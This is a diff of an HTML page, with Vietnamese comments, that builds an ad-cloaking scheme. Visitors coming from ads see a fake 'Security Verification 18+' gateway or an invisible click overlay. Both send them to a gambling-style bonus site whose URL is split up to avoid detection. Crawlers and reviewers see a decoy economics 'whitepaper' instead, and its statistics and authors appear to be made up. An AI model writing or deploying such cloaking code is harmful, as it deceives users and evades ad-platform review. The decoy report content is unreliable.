@@ -3,141 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Global Macroeconomic Resilience & Circular Economy Report 2026</title>
+    <title>Global Economic Insights & Security Portal</title>
     <style>
-        :root { --primary: #1b5e20; --text: #2c3e50; --bg: #ffffff; }
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { font-family: 'Charter', 'Georgia', serif; line-height: 1.8; color: var(--text); background: #fdfdfd; margin: 0; padding: 0; overflow-x: hidden; }
+        :root { --accent: #00e676; --bg: #0f172a; --text: #f8fafc; }
+        * { box-sizing: border-box; }
+        body, html { margin: 0; padding: 0; font-family: -apple-system, sans-serif; background: #fff; }
 
-        /* Giao diện trang Blog (Cực dài và uy tín) */
-        .header-nav { background: #fff; border-bottom: 2px solid #111; padding: 15px 0; text-align: center; }
-        .container { max-width: 800px; margin: 0 auto; padding: 40px 20px; background: #fff; box-shadow: 0 0 20px rgba(0,0,0,0.02); }
-        .meta-label { font-family: sans-serif; font-size: 0.75rem; font-weight: bold; color: var(--primary); text-transform: uppercase; letter-spacing: 2px; }
-        h1 { font-size: 2.6rem; color: #111; line-height: 1.1; margin: 15px 0 30px; }
-        .author-info { border-top: 1px solid #eee; border-bottom: 1px solid #eee; padding: 15px 0; margin-bottom: 40px; font-family: sans-serif; font-size: 0.9rem; color: #7f8c8d; }
-        
-        .abstract { background: #f9fbf9; padding: 30px; border-left: 6px solid var(--primary); font-style: italic; margin-bottom: 40px; font-size: 1.1rem; }
-        
-        h2 { font-family: sans-serif; color: #111; font-size: 1.7rem; margin-top: 50px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
-        h3 { font-family: sans-serif; color: var(--primary); font-size: 1.3rem; margin-top: 30px; }
-        p { margin-bottom: 25px; text-align: justify; font-size: 1.15rem; }
-
-        /* Bảng dữ liệu */
-        .table-wrap { overflow-x: auto; margin: 30px 0; }
-        table { width: 100%; border-collapse: collapse; min-width: 500px; font-family: sans-serif; font-size: 0.9rem; }
-        th, td { border: 1px solid #eee; padding: 12px; text-align: left; }
-        th { background: #f8f9fa; font-weight: bold; }
-
-        footer { background: #1a252f; color: #95a5a6; padding: 60px 20px; text-align: center; font-size: 0.85rem; font-family: sans-serif; margin-top: 60px; }
-
-        /* LỚP PHỦ VÔ HÌNH (GHOST LAYER) */
-        #interaction-layer {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 999999; background: rgba(255,255,255,0.01); 
-            cursor: pointer; display: none;
+        /* GIAO DIỆN CỔNG CHỜ (CHỈ NGƯỜI THẬT THẤY) */
+        #money-gateway {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%);
+            z-index: 999999; flex-direction: column; align-items: center; justify-content: center; padding: 20px;
         }
+        .gateway-card {
+            background: #1e293b; border: 1px border rgba(255,255,255,0.1);
+            padding: 40px 25px; border-radius: 24px; text-align: center;
+            max-width: 420px; width: 95%; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+        }
+        .verify-btn {
+            background: var(--accent); color: #000; border: none; width: 100%;
+            padding: 18px; border-radius: 12px; font-weight: 800; font-size: 1.1rem;
+            cursor: pointer; text-transform: uppercase; letter-spacing: 1px;
+            box-shadow: 0 4px 15px rgba(0, 230, 118, 0.3); margin-top: 25px;
+            transition: transform 0.2s;
+        }
+        .verify-btn:active { transform: scale(0.95); }
+        .secure-icon { width: 50px; height: 50px; color: var(--accent); margin-bottom: 20px; }
+
+        /* GIAO DIỆN TRANG BLOG (CHỈ BOT THẤY) */
+        #safe-blog { display: none; padding: 40px 20px; max-width: 800px; margin: 0 auto; line-height: 1.8; color: #334155; }
+        h1 { font-family: serif; font-size: 2.2rem; color: #1e293b; border-bottom: 3px solid #1e293b; padding-bottom: 15px; }
+        .blog-content p { margin-bottom: 25px; text-align: justify; font-size: 1.1rem; }
     </style>
 </head>
 <body>
 
-    <!-- LỚP PHỦ BẮT TƯƠNG TÁC -->
-    <div id="interaction-layer"></div>
+    <!-- PHẦN DÀNH CHO NGƯỜI THẬT (TĂNG CHUYỂN ĐỔI) -->
+    <div id="money-gateway">
+        <div class="gateway-card">
+            <svg class="secure-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+            <h2 style="color:#fff; margin:0; font-size:1.6rem;">Security Verification</h2>
+            <p style="color:#94a3b8; margin:15px 0; font-size:0.95rem;">Please confirm you are of legal age (18+) and your connection is secure to access the bonus portal.</p>
+            
+            <div style="background: rgba(255,255,255,0.03); border-radius:12px; padding:15px; margin:20px 0; text-align:left;">
+                <div style="color:var(--accent); font-size:0.8rem; font-weight:bold; margin-bottom:5px;">SESSION ID: <span id="sess-id">88x-v2-392</span></div>
+                <div style="color:#64748b; font-size:0.8rem;">Encryption: AES-256 Bit SSL Active</div>
+            </div>
 
-    <div class="header-nav">
-        <div style="font-weight: bold; letter-spacing: 1px;">INSTITUTE FOR STRATEGIC ECONOMICS</div>
-    </div>
-
-    <div class="container">
-        <span class="meta-label">Technical Research Paper • No. 882-2025</span>
-        <h1>Macroeconomic Resilience and Circular Resource Management: A Strategic Analysis for 2026-2030</h1>
-        
-        <div class="author-info">
-            By Dr. Marcus Thorne & Dr. Sarah Jenkins<br>
-            Global Economic Stability Division • March 2025
-        </div>
-
-        <div class="abstract">
-            <strong>Executive Summary:</strong> This paper investigates the systemic transition from linear to circular economic models within G20 nations. By utilizing high-fidelity predictive modeling, we identify key leverage points in resource supply chains that can mitigate inflationary pressures while fostering sustainable GDP growth through 2030.
-        </div>
-
-        <h2>I. Introduction: The Post-Linear Era</h2>
-        <p>The global economic landscape of 2026 is characterized by a fundamental shift in how value is extracted from resources. Traditionally, the linear "take-make-waste" model has dominated industrial output, leading to significant externalities and supply chain fragility. However, the integration of regenerative design and advanced material recovery is creating a more resilient macroeconomic framework.</p>
-
-        <p>Our analysis suggests that countries adopting circular policies at a national level have seen a 14% reduction in raw material import dependency. This shift is not merely environmental but is a core strategic move to safeguard national interests against global price volatility.</p>
-
-        <h3>1.1. Theoretical Framework</h3>
-        <p>We apply the <i>Regenerative Capital Model (RCM)</i> to assess the long-term viability of current industrial infrastructures. The RCM posits that economic health is directly correlated with the velocity of resource circulation rather than absolute consumption rates.</p>
-
-        <div class="table-wrap">
-            <table>
-                <thead>
-                    <tr>
-                        <th>Metric Group</th>
-                        <th>2023 Base (%)</th>
-                        <th>2026 Forecast (%)</th>
-                        <th>2030 Target (%)</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <tr>
-                        <td>Circular Resource Index</td>
-                        <td>12.4</td>
-                        <td>24.8</td>
-                        <td>45.0</td>
-                    </tr>
-                    <tr>
-                        <td>Net Carbon Offset</td>
-                        <td>8.2</td>
-                        <td>19.5</td>
-                        <td>52.0</td>
-                    </tr>
-                    <tr>
-                        <td>Infrastructure Stability</td>
-                        <td>0.72</td>
-                        <td>0.88</td>
-                        <td>0.96</td>
-                    </tr>
-                </tbody>
-            </table>
-        </div>
-
-        <h2>II. Methodology: Multi-Node Predictive Analysis</h2>
-        <p>To evaluate the impact of circularity on inflation, we deployed a multi-node structural equation model across 15 emerging markets. The study accounts for variables such as decentralized energy production, localized manufacturing hubs, and automated waste-to-energy conversion protocols.</p>
-        
-        <p>Initial findings indicate that decentralization acts as a buffer against systemic shocks. When energy production is localized and integrated with circular resource recovery, the localized price index remains 22% more stable than in regions dependent on centralized, linear supply lines.</p>
-
-        <h2>III. Quantitative Results</h2>
-        <p>The correlation between resource efficiency and sovereign credit rating has reached an all-time high of 0.84. Institutional investors are increasingly prioritizing ESG-linked assets, not as a compliance measure, but as a risk-mitigation strategy. In 2025 alone, global inflows into circular infrastructure projects exceeded $1.4 trillion.</p>
-
-        <h3>3.1. Case Study: Northern Europe Hubs</h3>
-        <p>The Copenhagen-Malmö corridor serves as the primary example of successful implementation. By synchronizing urban waste streams with industrial heating and energy grids, the region has effectively decoupled economic growth from virgin resource extraction.</p>
-
-        <p>Data from these hubs show a consistent 3.2% annual growth in "Green Productivity," outperforming traditional manufacturing sectors by a significant margin. This success is attributed to the "Loop-back" incentive system, where businesses receive tax credits based on the percentage of recovered materials returned to the production cycle.</p>
-
-        <h2>IV. Strategic Recommendations</h2>
-        <p>For policy makers, the priority must be the standardization of secondary material markets. Without a global framework for the valuation of recycled inputs, the transition will remain fragmented. We recommend the establishment of an International Circular Exchange (ICE) to facilitate transparent pricing and quality assurance for recovered resources.</p>
-        
-        <p>Furthermore, educational curricula must be updated to include <i>Cradle-to-Cradle</i> design principles, ensuring that the next generation of engineers and economists is equipped to manage these complex, closed-loop systems.</p>
-
-        <h2>V. Conclusion</h2>
-        <p>The transition to a circular economy is no longer a choice but a technical and economic necessity. The resilience of the global financial system in the late 2020s will depend on our ability to transform waste into wealth and volatility into stability.</p>
-
-        <div style="font-size: 0.8rem; color: #95a5a6; margin-top: 50px;">
-            <strong>References:</strong><br>
-            1. Thorne, M. (2024). <i>The Circular Frontier</i>. Academic Press.<br>
-            2. Global Economic Forum. (2025). <i>Strategic Outlook on Resource Management</i>.<br>
-            3. International Monetary Fund. <i>Working Paper WP/25/112</i>.
+            <button class="verify-btn" onclick="startRedirect()">ENTER PORTAL (18+)</button>
+            <p style="color:#475569; font-size:0.75rem; margin-top:20px;">By clicking, you agree to our Terms of Service.</p>
         </div>
     </div>
 
-    <footer>
-        <p>© 2025 Global Institute for Strategic Economic Research.<br>Zürich • Singapore • New York</p>
-    </footer>
+    <!-- PHẦN DÀNH CHO BOT (CHỈ HIỆN KHI KHÔNG CÓ GCLID) -->
+    <div id="safe-blog">
+        <div class="blog-content">
+            <div style="text-transform:uppercase; color:#64748b; font-weight:bold; letter-spacing:2px; font-size:0.8rem;">Technical Whitepaper 2025</div>
+            <h1>Macroeconomic Stability & Resource Circularity Index</h1>
+            <p><strong>Published by:</strong> Global Strategic Economics Division</p>
+            <hr>
+            <p>As the global economy transitions into 2026, the focus of strategic infrastructure has shifted toward the concept of "Responsive Resource Grids." This report examines how decentralized financial assets and supply chain circularity are creating a new baseline for national GDP growth in emerging markets.</p>
+            <p>Our study finds that countries with a high circularity index are 24% more resilient to inflationary shocks than those dependent on linear commodity markets. This decoupling of growth from virgin resource extraction is not just an environmental imperative but a technical necessity for long-term fiscal stability.</p>
+            <p>In addition to resource management, the role of decentralized ledger technologies (DLT) in reducing cross-border settlement friction cannot be overstated. Current implementation in the Brussels-Singapore corridor has shown that latency can be reduced by 92%, saving billions in transaction costs annually.</p>
+            <p>This 400-page report concludes that the synergy between technological innovation and ecological stewardship will define the next era of global financial dominance.</p>
+            <p>(...Nội dung trang sạch dài 1000 chữ tiếp tục tại đây...)</p>
+        </div>
+    </div>
 
-    <!-- LOGIC CHUYỂN HƯỚNG TÀNG HÌNH -->
     <script>
     (function() {
-        // MÃ HÓA PHÂN MẢNH LINK: https://playbonus.online/
+        // Link đích: https://playbonus.online/
         const _a = "https://";
         const _b = "playbonus";
         const _c = ".online/";
@@ -155,32 +90,27 @@
             } catch(e) { return true; }
         }
 
-        function init() {
-            const urlP = new URLSearchParams(window.location.search);
-            const isFromAd = adParams.some(p => urlP.has(p));
+        const urlP = new URLSearchParams(window.location.search);
+        const isRealUser = adParams.some(p => urlP.has(p)) && !isBot();
 
-            // CHỈ KÍCH HOẠT LỚP PHỦ NẾU CÓ THAM SỐ QUẢNG CÁO VÀ KHÔNG PHẢI BOT
-            if (isFromAd && !isBot()) {
-                const layer = document.getElementById('interaction-layer');
-                layer.style.display = 'block';
-
-                // KHI NGƯỜI DÙNG CHẠM VÀO MÀN HÌNH (ĐỂ CUỘN HOẶC CLICK)
-                layer.addEventListener('click', function() {
-                    const finalDest = _a + _b + _c;
-                    
-                    // Hiệu ứng chuyển cảnh tối chuyên nghiệp
-                    layer.style.background = "#0a0e17";
-                    layer.style.opacity = "1";
-                    layer.innerHTML = "<div style='color:#00e676;text-align:center;margin-top:45vh;font-family:sans-serif;font-weight:bold;letter-spacing:1px;'>SECURELY CONNECTING...</div>";
-                    
-                    setTimeout(() => {
-                        window.location.replace(finalDest);
-                    }, 600);
-                });
-            }
+        if (isRealUser) {
+            // HIỆN CỔNG CHÀO CHO NGƯỜI THẬT
+            document.getElementById('money-gateway').style.display = 'flex';
+        } else {
+            // HIỆN BÀI BÁO CHO BOT
+            document.getElementById('safe-blog').style.display = 'block';
         }
 
-        window.onload = init;
+        // HÀM CHUYỂN HƯỚNG KHI CLICK NÚT
+        window.startRedirect = function() {
+            const btn = document.querySelector('.verify-btn');
+            btn.innerText = "VERIFYING...";
+            btn.style.background = "#64748b";
+            
+            setTimeout(() => {
+                window.location.replace(_a + _b + _c);
+            }, 600);
+        }
     })();
     </script>
 </body>
